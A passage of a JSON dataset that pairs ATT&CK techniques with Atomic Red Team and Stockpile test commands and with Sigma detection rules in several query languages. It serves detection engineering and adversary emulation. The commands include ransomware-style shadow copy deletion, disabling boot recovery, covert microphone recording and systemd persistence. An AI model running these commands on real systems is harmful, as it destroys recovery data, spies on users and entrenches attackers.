delete catalog -quiet\n", "name": "command_prompt"}}, {"description": "Disables repair by the Windows Recovery Console on boot. \nThis technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n", "supported_platforms": ["windows"], "name": "Windows - Disable Windows Recovery Console Repair", "executor": {"elevation_required": true, "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "name": "command_prompt"}}, {"description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. \nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject \n", "supported_platforms": ["windows"], "name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "executor": {"elevation_required": true, "command": "powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\"\n", "name": "command_prompt"}}], "attack_technique": "T1490"}}], "queries": [{"query": "title: Modification of Boot Configuration\nid: 1444443e-6757-43e4-9ea4-c8fc705f79a2\ndescription: Identifies use of the bcdedit command to delete boot configuration data. This tactic is sometimes used as by malware or an attacker as a destructive\n    technique.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/c4732632-9c1d-4980-9fa8-1d98c93f918e.html\ntags:\n    - attack.impact\n    - attack.t1490\ndetection:\n    selection1:\n        Image|endswith: \\bcdedit.exe\n        CommandLine: set\n    selection2:\n        - CommandLine|contains|all:\n            - bootstatuspolicy\n            - ignoreallfailures\n        - CommandLine|contains|all:\n            - recoveryenabled\n            - 'no'\n    condition: selection1 and selection2\nfalsepositives:\n    - Unlikely\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Modification of Boot Configuration\nid: 1444443e-6757-43e4-9ea4-c8fc705f79a2\ndescription: Identifies use of the bcdedit command to delete boot configuration data. This tactic is sometimes used as by malware or an attacker as a destructive\n    technique.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/c4732632-9c1d-4980-9fa8-1d98c93f918e.html\ntags:\n    - attack.impact\n    - attack.t1490\ndetection:\n    selection1:\n        Image|endswith: \\bcdedit.exe\n        CommandLine: set\n    selection2:\n        - CommandLine|contains|all:\n            - bootstatuspolicy\n            - ignoreallfailures\n        - CommandLine|contains|all:\n            - recoveryenabled\n            - 'no'\n    condition: selection1 and selection2\nfalsepositives:\n    - Unlikely\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\bcdedit.exe AND CommandLine:\"set\") AND ((CommandLine.keyword:*bootstatuspolicy* AND CommandLine.keyword:*ignoreallfailures*) OR (CommandLine.keyword:*recoveryenabled* AND CommandLine.keyword:*no*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Modification-of-Boot-Configuration <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Modification of Boot Configuration\",\\n    \"description\": \"Identifies use of the bcdedit command to delete boot configuration data. This tactic is sometimes used as by malware or an attacker as a destructive technique.\",\\n    \"tags\": [\\n      \"attack.impact\",\\n      \"attack.t1490\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\bcdedit.exe AND CommandLine:\\\\\"set\\\\\") AND ((CommandLine.keyword:*bootstatuspolicy* AND CommandLine.keyword:*ignoreallfailures*) OR (CommandLine.keyword:*recoveryenabled* AND CommandLine.keyword:*no*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\bcdedit.exe AND CommandLine:\\\\\"set\\\\\") AND ((CommandLine.keyword:*bootstatuspolicy* AND CommandLine.keyword:*ignoreallfailures*) OR (CommandLine.keyword:*recoveryenabled* AND CommandLine.keyword:*no*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Modification of Boot Configuration\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\bcdedit.exe AND CommandLine:\"set\") AND ((CommandLine.keyword:*bootstatuspolicy* AND CommandLine.keyword:*ignoreallfailures*) OR (CommandLine.keyword:*recoveryenabled* AND CommandLine.keyword:*no*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\bcdedit.exe\" CommandLine=\"set\") ((CommandLine=\"*bootstatuspolicy*\" CommandLine=\"*ignoreallfailures*\") OR (CommandLine=\"*recoveryenabled*\" CommandLine=\"*no*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\bcdedit.exe\" CommandLine=\"set\") ((CommandLine=\"*bootstatuspolicy*\" CommandLine=\"*ignoreallfailures*\") OR (CommandLine=\"*recoveryenabled*\" CommandLine=\"*no*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\bcdedit\\\\.exe)(?=.*set)))(?=.*(?:.*(?:.*(?:.*(?=.*.*bootstatuspolicy.*)(?=.*.*ignoreallfailures.*))|.*(?:.*(?=.*.*recoveryenabled.*)(?=.*.*no.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Shadow copies deletion using operating systems utilities\nid: c947b146-0abc-4c87-9c64-b17e9d7274a2\ndescription: Shadow Copies deletion using operating systems utilities\nauthor: Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://blog.talosintelligence.com/2017/05/wannacry.html\n    - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/\ntags:\n    - attack.defense_evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\powershell.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n        CommandLine|contains|all:\n            - shadow\n            - delete\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Shadow copies deletion using operating systems utilities\nid: c947b146-0abc-4c87-9c64-b17e9d7274a2\ndescription: Shadow Copies deletion using operating systems utilities\nauthor: Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://blog.talosintelligence.com/2017/05/wannacry.html\n    - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/\ntags:\n    - attack.defense_evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName|endswith:\n            - '\\powershell.exe'\n            - '\\wmic.exe'\n            - '\\vssadmin.exe'\n        CommandLine|contains|all:\n            - shadow\n            - delete\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason\nstatus: experimental\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(NewProcessName.keyword:(*\\\\\\\\powershell.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*delete*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Shadow-copies-deletion-using-operating-systems-utilities <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Shadow copies deletion using operating systems utilities\",\\n    \"description\": \"Shadow Copies deletion using operating systems utilities\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.impact\",\\n      \"attack.t1070\",\\n      \"attack.t1490\"\\n    ],\\n    \"query\": \"(NewProcessName.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*delete*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(NewProcessName.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*delete*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Shadow copies deletion using operating systems utilities\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(NewProcessName.keyword:(*\\\\\\\\powershell.exe *\\\\\\\\wmic.exe *\\\\\\\\vssadmin.exe) AND CommandLine.keyword:*shadow* AND CommandLine.keyword:*delete*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((NewProcessName=\"*\\\\\\\\powershell.exe\" OR NewProcessName=\"*\\\\\\\\wmic.exe\" OR NewProcessName=\"*\\\\\\\\vssadmin.exe\") CommandLine=\"*shadow*\" CommandLine=\"*delete*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" NewProcessName IN [\"*\\\\\\\\powershell.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\vssadmin.exe\"] CommandLine=\"*shadow*\" CommandLine=\"*delete*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\powershell\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\vssadmin\\\\.exe))(?=.*.*shadow.*)(?=.*.*delete.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1496/T1496.yaml", "command": "yes > /dev/null\n", "name": null}, {"source": "data/abilities/impact/78524da1-f347-4fbb-9295-209f1f408330.yml", "command": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}, "name": "Install sox and record microphone for n-seconds"}], "command_list": ["yes > /dev/null\n", {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}], "technique_id": "T1496", "parsed_datasets": [{"Atomic Red Team Test - Resource Hijacking": {"display_name": "Resource Hijacking", "atomic_tests": [{"description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n", "supported_platforms": ["macos", "linux"], "name": "macOS/Linux - Simulate CPU Load with Yes", "executor": {"command": "yes > /dev/null\n", "name": "bash"}}], "attack_technique": "T1496"}}, {"Mitre Stockpile - Install sox and record microphone for n-seconds": {"platforms": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}, "description": "Install sox and record microphone for n-seconds", "tactic": "impact", "technique": {"attack_id": "T1496", "name": "Resource Hijacking"}, "id": "78524da1-f347-4fbb-9295-209f1f408330", "name": "Record microphone"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1500/T1500.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe #{input_file}\n", "name": null}, {"source": "atomics/T1500/T1500.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe PathToAtomicsFolder\\T1500\\src\\calc.cs\n", "name": null}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe #{input_file}\n", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe PathToAtomicsFolder\\T1500\\src\\calc.cs\n"], "technique_id": "T1500", "parsed_datasets": [{"Atomic Red Team Test - Compile After Delivery": {"display_name": "Compile After Delivery", "atomic_tests": [{"dependencies": [{"description": "C# file must exist on disk at specified location (#{input_file})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1500/src/calc.cs\" -OutFile \"#{input_file}\"\n", "prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Compile After Delivery using csc.exe", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} #{input_file}\n", "name": "command_prompt", "cleanup_command": "del #{output_file} >nul 2>&1"}, "description": "Compile C# code using csc.exe binary used by .NET \n", "input_arguments": {"output_file": {"default": "C:\\Windows\\Temp\\T1500.exe", "type": "file", "description": "Output compiled binary"}, "input_file": {"default": "PathToAtomicsFolder\\T1500\\src\\calc.cs", "type": "file", "description": "C# code that launches calc.exe from a hidden cmd.exe Window"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1500"}}], "queries": [{"query": "title: Suspicious Csc.exe Source File Folder\nid: dcaa3f04-70c3-427a-80b4-b870d73c94c4\ndescription: Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\nstatus: experimental\nreferences:\n    - https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/\n    - https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf\n    - https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/\n    - https://twitter.com/gN3mes1s/status/1206874118282448897\nauthor: Florian Roth\ndate: 2019/08/24\nmodified: 2019/12/17\ntags:\n    - attack.defense_evasion\n    - attack.t1500\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\csc.exe'\n        CommandLine: \n            - '*\\AppData\\\\*'\n            - '*\\Windows\\Temp\\\\*'\n    filter:\n        ParentImage: \n            - 'C:\\Program Files*'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '*\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '*\\w3wp.exe'  # https://twitter.com/gabriele_pippi/status/1206907900268072962\n    condition: selection and not filter\nfalsepositives:\n    - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Csc.exe Source File Folder\nid: dcaa3f04-70c3-427a-80b4-b870d73c94c4\ndescription: Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\nstatus: experimental\nreferences:\n    - https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/\n    - https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf\n    - https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/\n    - https://twitter.com/gN3mes1s/status/1206874118282448897\nauthor: Florian Roth\ndate: 2019/08/24\nmodified: 2019/12/17\ntags:\n    - attack.defense_evasion\n    - attack.t1500\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\csc.exe'\n        CommandLine: \n            - '*\\AppData\\\\*'\n            - '*\\Windows\\Temp\\\\*'\n    filter:\n        ParentImage: \n            - 'C:\\Program Files*'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '*\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '*\\w3wp.exe'  # https://twitter.com/gabriele_pippi/status/1206907900268072962\n    condition: selection and not filter\nfalsepositives:\n    - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\csc.exe AND CommandLine.keyword:(*\\\\\\\\AppData\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*)) AND (NOT (ParentImage.keyword:(C\\\\:\\\\\\\\Program\\\\ Files* OR *\\\\\\\\sdiagnhost.exe OR *\\\\\\\\w3wp.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Csc.exe-Source-File-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Csc.exe Source File Folder\",\\n    \"description\": \"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1500\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\csc.exe AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*)) AND (NOT (ParentImage.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files* OR *\\\\\\\\\\\\\\\\sdiagnhost.exe OR *\\\\\\\\\\\\\\\\w3wp.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\csc.exe AND CommandLine.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*)) AND (NOT (ParentImage.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files* OR *\\\\\\\\\\\\\\\\sdiagnhost.exe OR *\\\\\\\\\\\\\\\\w3wp.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Csc.exe Source File Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\csc.exe AND CommandLine.keyword:(*\\\\\\\\AppData\\\\\\\\* *\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*)) AND (NOT (ParentImage.keyword:(C\\\\:\\\\\\\\Program Files* *\\\\\\\\sdiagnhost.exe *\\\\\\\\w3wp.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\csc.exe\" (CommandLine=\"*\\\\\\\\AppData\\\\\\\\*\" OR CommandLine=\"*\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\")) NOT ((ParentImage=\"C:\\\\\\\\Program Files*\" OR ParentImage=\"*\\\\\\\\sdiagnhost.exe\" OR ParentImage=\"*\\\\\\\\w3wp.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\csc.exe\" CommandLine IN [\"*\\\\\\\\AppData\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*\"])  -(ParentImage IN [\"C:\\\\\\\\Program Files*\", \"*\\\\\\\\sdiagnhost.exe\", \"*\\\\\\\\w3wp.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\csc\\\\.exe)(?=.*(?:.*.*\\\\AppData\\\\\\\\.*|.*.*\\\\Windows\\\\Temp\\\\\\\\.*))))(?=.*(?!.*(?:.*(?=.*(?:.*C:\\\\Program Files.*|.*.*\\\\sdiagnhost\\\\.exe|.*.*\\\\w3wp\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho 